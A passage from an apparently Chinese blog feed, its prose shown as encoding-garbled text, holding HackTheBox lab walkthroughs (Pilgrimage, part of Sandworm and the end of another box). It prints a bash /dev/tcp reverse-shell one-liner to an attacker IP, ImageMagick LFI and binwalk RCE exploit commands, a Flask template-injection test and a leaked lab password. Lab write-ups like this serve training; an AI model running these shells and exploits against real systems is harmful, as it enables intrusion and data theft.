<p>å¦‚æœæœ¬åœ°kaliä¸æ˜¯rootç”¨æˆ·ç”Ÿæˆçš„å¯†é’¥ï¼Œéœ€è¦ç”¨<code>chmod 600 id_rsa</code>ç»™ç§é’¥æ·»åŠ æƒé™</p>
<p>ç”¨å¦‚ä¸‹å‘½ä»¤é€šè¿‡ç§é’¥è¿æ¥ssh</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa juno@10.10.11.216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010143240849.png"></p>
<p>æŸ¥çœ‹ç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010144058201.png"></p>
<p>æœ¬åœ°kaliå¼€å¯sshç«¯å£è½¬å‘</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åæµè§ˆå™¨è®¿é—®<code>localhost:8888</code>ï¼Œéœ€è¦passwordæˆ–tokenç™»å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145317035.png"></p>
<h2 id="å…­ã€ç™»å½•å‡­æ®æ³„éœ²äºŒæ¬¡åå¼¹shell"><a href="#å…­ã€ç™»å½•å‡­æ®æ³„éœ²äºŒæ¬¡åå¼¹shell" class="headerlink" title="å…­ã€ç™»å½•å‡­æ®æ³„éœ²äºŒæ¬¡åå¼¹shell"></a>å…­ã€ç™»å½•å‡­æ®æ³„éœ²äºŒæ¬¡åå¼¹shell</h2><p>ä¹‹å‰è¯´<code>jovian</code>ç”¨æˆ·çš„æ–‡ä»¶<code>postgres</code>ç”¨æˆ·æ— å¯è¯»æƒé™ï¼Œæ­¤æ—¶æˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œæœ‰ä¸ªç›®å½•<code>/opt/solar-flares</code></p>
<pre class="line-numbers language-none"><code class="language-none">find / -user jovian 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010144515981.png"></p>
<p>åœ¨<code>/opt/solar-flares/logs</code>ç›®å½•ä¸‹æœ‰æ—¥å¿—æ–‡ä»¶ï¼Œéšä¾¿æ‰“å¼€ä¸€ä¸ªçœ‹ä¼šæœ‰token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145731032.png"></p>
<p>é‚£ä¹ˆå¯ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶å†…çš„æ‰€æœ‰token</p>
<pre class="line-numbers language-none"><code class="language-none">cat * | grep â€œtokenâ€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145907085.png"></p>
<p>tokenå¾ˆå¤šï¼Œç”¨æœ€åä¸€ä¸ªï¼Œå› ä¸ºæœ€åä¸€ä¸ªæ˜¯æœ€è¿‘ç™»å½•çš„æœ‰æ•ˆtokenï¼ŒæˆåŠŸç™»å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010150042662.png"></p>
<p>æ‰“å¼€<code>flares.ipynb</code>ï¼Œç‚¹å‡»ä¸Šä¾§èœå•æ <code>File</code>â†’<code>New Notebook</code>â†’<code>Python3 (ipykernel)</code> æ–°å»ºä¸€ä¸ªè„šæœ¬</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010151813888.png"></p>
<p>å†™å…¥åå¼¹shellè„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">import os; os.system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1"')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152100908.png"></p>
<p>æœ¬åœ°kaliå¼€å¯ç›‘å¬ï¼Œç‚¹å‡»Runï¼ŒæˆåŠŸè·å–<code>jovian</code>ç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152212220.png"></p>
<h2 id="ä¸ƒã€ä»»æ„æ–‡ä»¶è¯»å–è·å–rootæ–‡ä»¶"><a href="#ä¸ƒã€ä»»æ„æ–‡ä»¶è¯»å–è·å–rootæ–‡ä»¶" class="headerlink" title="ä¸ƒã€ä»»æ„æ–‡ä»¶è¯»å–è·å–rootæ–‡ä»¶"></a>ä¸ƒã€ä»»æ„æ–‡ä»¶è¯»å–è·å–rootæ–‡ä»¶</h2><p><code>sudo -l</code>æŸ¥çœ‹å¯æ‰§è¡Œçš„å‘½ä»¤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152305213.png"></p>
<p>æ‰§è¡Œï¼Œæç¤ºæ²¡æ‰¾åˆ°é…ç½®æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010170332042.png"></p>
<p>ç”¨stringsåˆ†æä¸€ä¸‹è¿™ä¸ªå‘½ä»¤æ–‡ä»¶é‡Œå¯èƒ½æœ‰ä»€ä¹ˆé…ç½®æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/sattrack | grep -i config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155633302.png"></p>
<p>çœ‹åˆ°æœ‰<code>/tmp/config.json</code>ï¼Œä½†å®é™…å»æ‰¾çš„æ—¶å€™å´æ²¡æœ‰ï¼Œäºæ˜¯ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥æ‰¾<code>config.json</code></p>
<pre class="line-numbers language-none"><code class="language-none">find / -name config.json 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155700034.png"></p>
<p>å‘ç°<code>/usr/local/share/sattrack/config.json</code>ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¼šä»<code>/tmp</code>ç›®å½•è¯»å–é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°<code>/tmp/config.json</code></p>
<pre class="line-numbers language-none"><code class="language-none">cp /usr/local/share/sattrack/config.json /tmp/config.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŸ¥çœ‹é…ç½®æ–‡ä»¶å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155829789.png"></p>
<p>å†æ¬¡æ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°tmpç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªtleç›®å½•ï¼Œç›®å½•å†…æ˜¯é…ç½®æ–‡ä»¶ä¸­<code>tlesources</code>çš„å†…å®¹ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ä»ç›®æ ‡é“¾æ¥æŠŠæ–‡ä»¶ä¸‹è½½åˆ°tleç›®å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010173152484.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹é…ç½®æ–‡ä»¶<code>tlesources</code>ä¸ºå¦‚ä¸‹ï¼Œç›´æ¥è¯»å–root.txt</p>
<pre class="line-numbers language-none"><code class="language-none">file:///root/root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010161114463.png"></p>
<p>å†æ¬¡æ‰§è¡Œï¼Œå‘ç°root.txtæˆåŠŸè¢«è¯»å–å‡ºæ¥ï¼Œä»»æ„æ–‡ä»¶è¯»å–</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/local/bin/sattrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010161211605.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010170408938.png" style="zoom:67%;">

]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>PostgreSQLæ³¨å…¥</tag>
        <tag>sshå…¬é’¥ä¼ªé€ </tag>
        <tag>JupyteræœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Pilgrimage</title>
    <url>/posts/3e4c0ff8.html</url>
    <content><![CDATA[<h1 id="HTB-Pilgrimage"><a href="#HTB-Pilgrimage" class="headerlink" title="HTB-Pilgrimage"></a>HTB-Pilgrimage</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.nmapç«¯å£æ‰«æå‘ç°gitæºç æ³„éœ²ï¼›</p>
<p>2.è¯»æºç å‘ç°å‹ç¼©å›¾ç‰‡ç”¨çš„magickå‘½ä»¤ï¼Œä¸”å‘ç°æ•°æ®åº“æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼›</p>
<p>3.ImageMagick LFIè¯»å–sshè´¦æˆ·ç”¨æˆ·åå£ä»¤ï¼›</p>
<p>4.è¿è¡Œpspy64å‘ç°æœ‰ç›‘è§†ä»»åŠ¡ï¼›</p>
<p>5.binwalk RCEææƒè·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111005798.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111425518.png"></p>
<p>80ç«¯å£å¼€æ”¾ï¼Œæœ‰åŸŸåï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.219 pilgrimage.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111101520.png" style="zoom: 67%;">

<p>ä¸»é¡µæ˜¯ä¸€ä¸ªå‹ç¼©å›¾ç‰‡çš„åŠŸèƒ½ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œç‚¹å‡»Shrinkï¼ŒæˆåŠŸåä¼šè¿”å›å›¾ç‰‡é“¾æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134544764.png"></p>
<p>nmapæ‰«æç»“æœçœ‹åˆ°æœ‰gitä»“åº“</p>
<p>ç”¨git-dumperæŠŠgitä»“åº“ä¸‹è½½ä¸‹æ¥ï¼š<a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
<pre class="line-numbers language-none"><code class="language-none">python3 git_dumper.py http://pilgrimage.htb/.git/ ./pilgrimage/git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007133646940.png" style="zoom: 80%;">

<p>åœ¨<code>index.php</code>çœ‹åˆ°ä¼šæ‰§è¡Œ<code>/var/www/pilgrimage.htb/magick</code>ï¼Œè¿˜æœ‰sqliteæ•°æ®åº“æ–‡ä»¶<code>/var/db/pilgrimage</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134240850.png"></p>
<h2 id="ä¸‰ã€ImageMagick-LFIï¼ˆCVE-2022-44268ï¼‰"><a href="#ä¸‰ã€ImageMagick-LFIï¼ˆCVE-2022-44268ï¼‰" class="headerlink" title="ä¸‰ã€ImageMagick LFIï¼ˆCVE-2022-44268ï¼‰"></a>ä¸‰ã€ImageMagick LFIï¼ˆCVE-2022-44268ï¼‰</h2><p>googleå…³é”®å­—ï¼šImageMagick poc</p>
<p><a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">https://github.com/Sybil-Scan/imagemagick-lfi-poc</a></p>
<p>ç”¨è„šæœ¬ç”Ÿæˆæ¶æ„å›¾ç‰‡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/etc/passwd" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134913194.png"></p>
<p>åœ¨ç½‘ç«™é¦–é¡µä¸Šä¼ ï¼Œç„¶åç”¨è¿”å›çš„é“¾æ¥ä¸‹è½½</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://pilgrimage.htb/shrunk/6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å†ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å›¾ç‰‡è¯¦ç»†ä¿¡æ¯</p>
<pre class="line-numbers language-none"><code class="language-none">identify -verbose 6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å›¾ç‰‡çš„éƒ¨åˆ†åå…­è¿›åˆ¶ç¼–ç å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135439660.png"></p>
<p>åå…­è¿›åˆ¶è§£ç ï¼š<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135515096.png"></p>
<p>å¯çœ‹åˆ°è¯»å–åˆ°çš„<code>/etc/passwd</code>å†…å®¹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªéå¸¸è§„ç”¨æˆ·<code>emily</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135740333.png"></p>
<p>åˆšæ‰åœ¨<code>index.php</code>çœ‹åˆ°çš„sqliteæ•°æ®åº“æ–‡ä»¶<code>/var/db/pilgrimage</code>ï¼ŒåŒæ ·ç”¨ä¸Šè¿°æ–¹æ³•è¯»å–</p>
<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/var/db/pilgrimage" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>éƒ¨åˆ†å…³é”®ç¼–ç å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140339311.png"></p>
<p>çœ‹åˆ°æœ‰emilyç”¨æˆ·çš„ç”¨æˆ·åå£ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">emily
abigchonkyboi123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">ssh emily@10.10.11.219<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140421955.png"></p>
<h2 id="å››ã€binwalk-RCEææƒ"><a href="#å››ã€binwalk-RCEææƒ" class="headerlink" title="å››ã€binwalk RCEææƒ"></a>å››ã€binwalk RCEææƒ</h2><p>è¿ä¸Šsshåï¼Œåœ¨é¶æœºè¿è¡Œpspy64ï¼Œçœ‹åˆ°æœ‰<code>/usr/sbin/malwarescan.sh</code>è„šæœ¬ï¼Œå¦å¤–</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141040913.png"></p>
<blockquote>
<p>è§£é‡Šå‘½ä»¤ï¼š<code>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/</code></p>
<p>-mï¼šè¿›å…¥ç›‘è§†æ¨¡å¼ï¼ˆmonitor modeï¼‰ï¼›</p>
<p>-e createï¼šç›‘è§†æ–‡ä»¶çš„åˆ›å»ºäº‹ä»¶ï¼›</p>
<p>å½“ <code>/var/www/pilgrimage.htb/shrunk/</code> ç›®å½•ä¸­æœ‰æ–°æ–‡ä»¶è¢«åˆ›å»ºæ—¶ï¼Œå°†æ˜¾ç¤ºç›¸å…³ä¿¡æ¯ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹<code>/usr/sbin/malwarescan.sh</code>ï¼Œä¼šæŠŠ<code>/var/www/pilgrimage.htb/shrunk/</code> ç›®å½•æ–°åˆ›å»ºçš„æ–‡ä»¶ç”¨<code>binwalk</code>å¤„ç†ï¼Œé‚£ä¹ˆå°±å°è¯•çœ‹binwalkæœ‰æ²¡æœ‰å¯åˆ©ç”¨ç‚¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141344752.png"></p>
<p>æŸ¥çœ‹binwalkç‰ˆæœ¬</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141501172.png"></p>
<p>googleå‘ç°å¯¹åº”ç‰ˆæœ¬binwalkå­˜åœ¨RCE</p>
<p><a href="https://www.exploit-db.com/exploits/51249">https://www.exploit-db.com/exploits/51249</a></p>
<p>éšä¾¿æ‰¾ä¸€å¼ å›¾ç‰‡wa0er.pngä½œä¸ºè¾“å…¥ï¼Œæ‰§è¡Œè„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py wa0er.png 10.10.14.5 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898	#å¼€å¯ç›‘å¬
python3 -m http.server 80	#å¼€å¯httpæœåŠ¡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">cd /var/www/pilgrimage.htb/shrunk/
wget http://10.10.14.5/binwalk_exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æˆåŠŸåå¼¹shellï¼Œè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007143747196.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007154416524.png" style="zoom:67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>gitæºç æ³„éœ²</tag>
        <tag>ImageMagick LFI</tag>
        <tag>binwalk RCEææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Sandworm</title>
    <url>/posts/5f6105d4.html</url>
    <content><![CDATA[<h1 id="HTB-Sandworm"><a href="#HTB-Sandworm" class="headerlink" title="HTB-Sandworm"></a>HTB-Sandworm</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ç«¯å£æ‰«æå‘ç°åŸŸåï¼Œç›®å½•æ‰«æå‘ç°PGPç­¾åéªŒè¯åŠŸèƒ½ï¼›</p>
<p>2.ç­¾åéªŒè¯åŠŸèƒ½å­˜åœ¨Flaskæ¨¡æ¿æ³¨å…¥ï¼›</p>
<p>3.Flaskæ¨¡æ¿æ³¨å…¥åå¼¹shellè·å–<code>atlas</code>ç”¨æˆ·webæƒé™ï¼›</p>
<p>4.é…ç½®æ–‡ä»¶ä¿¡æ¯æ³„éœ²è·å–sshè´¦æˆ·<code>silentobserver</code>ï¼›</p>
<p>5.ç™»å½•sshè´¦æˆ·ï¼Œè¿è¡Œpspy64å’Œlinpeaså‘ç°è®¡åˆ’ä»»åŠ¡å’ŒSUIDæ–‡ä»¶ï¼›</p>
<p>6.Rustè®¡åˆ’ä»»åŠ¡ææƒè·å–<code>atlas</code>åœ¨<code>jailer</code>ç»„çš„shellæƒé™ï¼›</p>
<p>7.<code>firejail</code>çš„SUIDææƒè·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102130015615.png"></p>
<p>å‘ç°åŸŸåï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.218 ssa.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®ï¼Œæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102130626254.png" style="zoom: 67%;">

<p>æ‰«æç›®å½•</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster dir -u https://ssa.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html -t 50 -k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143621492.png"></p>
<p>æœ‰å‡ ä¸ªéå¸¸è§„ç›®å½•</p>
<p><code>/admin</code>å¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143412051.png" style="zoom:67%;">

<p><code>/guide</code>å¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143702183.png" style="zoom:67%;">

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155645054.png" style="zoom:67%;">

<p>æœ‰é€šè¿‡PGPå…¬é’¥éªŒè¯ç­¾åçš„åŠŸèƒ½ï¼Œå¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155716430.png" style="zoom:67%;">

<p>é¡µé¢åº•éƒ¨è¿˜æœ‰ä¸€æ®µè¢«ç­¾åçš„æ¶ˆæ¯ï¼Œå¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180453944.png" style="zoom:67%;">

<p><code>/pgp</code>å¦‚ä¸‹å›¾ï¼Œæ˜¯PGPå…¬é’¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143757596.png"></p>
<p>é‚£ä¹ˆå¯ä»¥æŠŠæ­¤å¤„çš„å…¬é’¥å’Œ<code>/guide</code>é¡µé¢åº•éƒ¨è¢«ç­¾åçš„æ¶ˆæ¯ï¼Œå¡«å…¥åˆ°<code>/guide</code>é¡µé¢éªŒè¯ç­¾ååŠŸèƒ½å¯¹åº”çš„æ–‡æœ¬æ¡†ä¸­ï¼Œç‚¹å‡»éªŒè¯ç­¾ååï¼Œå¼¹å‡ºå¦‚ä¸‹å†…å®¹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180845906.png" style="zoom:67%;">

<p>ä¸<code>/guide</code>é¡µé¢åº•éƒ¨çš„æç¤ºè¯´æ˜ä¸€è‡´ï¼Œè¯´æ˜ç­¾åéªŒè¯æˆåŠŸï¼Œæ¶ˆæ¯çš„æœºå¯†æ€§ã€å¯ç”¨æ€§ã€å®Œæ•´æ€§è¢«ä¿è¯</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180944253.png" style="zoom: 80%;">

<p>ä»<code>/guide</code>é¡µé¢çš„ç‰ˆæƒæ ‡å¿—å¤„çœ‹å‡ºç”¨çš„python Flaskæ¡†æ¶ï¼Œæ­¤æ¡†æ¶ä¸»è¦æ¼æ´å°±æ˜¯SSTIï¼ˆServer Side Template Injectionï¼‰ï¼Œæ­¤å¤„PGPç­¾ååŠŸèƒ½æœ‰äº¤äº’ï¼Œå¯ä»¥åœ¨æ­¤å¤„ç”¨è¿™ä¸ªåŠŸèƒ½åšæµ‹è¯•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103181120088.png"></p>
<h2 id="ä¸‰ã€Flask-SSTIï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰"><a href="#ä¸‰ã€Flask-SSTIï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰" class="headerlink" title="ä¸‰ã€Flask SSTIï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰"></a>ä¸‰ã€Flask SSTIï¼ˆæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰</h2><p>é‚£ä¹ˆåœ¨æœ¬åœ°kaliä¸Šï¼Œç”¨gpgç”Ÿæˆå…¬ç§é’¥å¯¹</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --gen-key	#ç”Ÿæˆå¯†é’¥å¯¹
Real name: {{100*100}}	#æµ‹è¯•æ¨¡æ¿æ³¨å…¥ï¼Œå¦‚æœè¢«æ‰§è¡Œï¼Œä¼šæ˜¾ç¤º10000
Email address: &lt;any_mail&gt;ï¼ˆé‚®ç®±éšæ„ï¼Œæ­¤å¤„é‡‡ç”¨åœ¨/guideé¡µé¢åº•éƒ¨å‘ç°çš„atlas@ssa.htbï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155959507.png"></p>
<pre class="line-numbers language-none"><code class="language-none">gpg --list-keys	#åˆ—å‡ºæ‰€æœ‰å…¬ç§é’¥å¯¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102160233547.png"></p>
<p>å°†æŒ‡å®šç”µå­é‚®ä»¶åœ°å€ï¼ˆæ­¤å¤„æ˜¯<code>atlas@ssa.htb</code>ï¼‰çš„å…¬é’¥å¯¼å‡ºä¸ºæ–‡æœ¬æ ¼å¼ï¼Œå¹¶å°†å®ƒä¿å­˜åˆ°<code>public_key.asc</code>æ–‡ä»¶ä¸­</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --armor --export atlas@ssa.htb &gt; public_key.asc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>--armor</code>: è¿™ä¸ªé€‰é¡¹æŒ‡ç¤º GnuPG å¯¼å‡ºçš„å¯†é’¥åº”è¯¥ä»¥æ–‡æœ¬æ ¼å¼ï¼ˆASCII armoredï¼‰å¯¼å‡ºï¼Œè€Œä¸æ˜¯äºŒè¿›åˆ¶æ ¼å¼ã€‚ASCII armored å¯†é’¥æ›´æ˜“äºå…±äº«å’Œä¼ è¾“ï¼Œé€šå¸¸ç”¨äºé€šè¿‡ç”µå­é‚®ä»¶æˆ–æ–‡æœ¬æ–‡ä»¶åˆ†äº«å…¬é’¥ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162102538.png"></p>
<p>åˆ›å»ºä¸€ä¸ªåä¸º<code>message.txt</code>çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶ˆæ¯<code>test</code>ã€‚ä½¿ç”¨ GnuPG å¯¹<code>message.txt</code>æ–‡ä»¶ä¸­çš„æ¶ˆæ¯<code>test</code>è¿›è¡Œæ•°å­—ç­¾åï¼Œå¹¶å°†å¸¦æœ‰æ•°å­—ç­¾åçš„æ¶ˆæ¯ä¿å­˜ä¸º <code>signed_message.asc</code>ã€‚è¿™ä¸ªç­¾åå¯ä»¥ç”¨äºéªŒè¯æ¶ˆæ¯çš„å®Œæ•´æ€§å’Œæ¥æºï¼Œç¡®ä¿å®ƒæ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œå¹¶ç”±ç§é’¥æŒæœ‰è€…ç­¾åã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">echo "test" &gt; message.txt
gpg --clear-sign --output signed_message.asc message.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>--clear-sign</code>: è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ GnuPG å¯¹æ¶ˆæ¯æ‰§è¡Œ<code>clear sign</code>ï¼Œè¿™æ„å‘³ç€æ•°å­—ç­¾åå°†è¢«æ·»åŠ åˆ°æ¶ˆæ¯çš„æœ«å°¾ï¼Œå¹¶ä¸”æ¶ˆæ¯å†…å®¹æœ¬èº«ä¿æŒå¯è¯»æ€§ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162129479.png"></p>
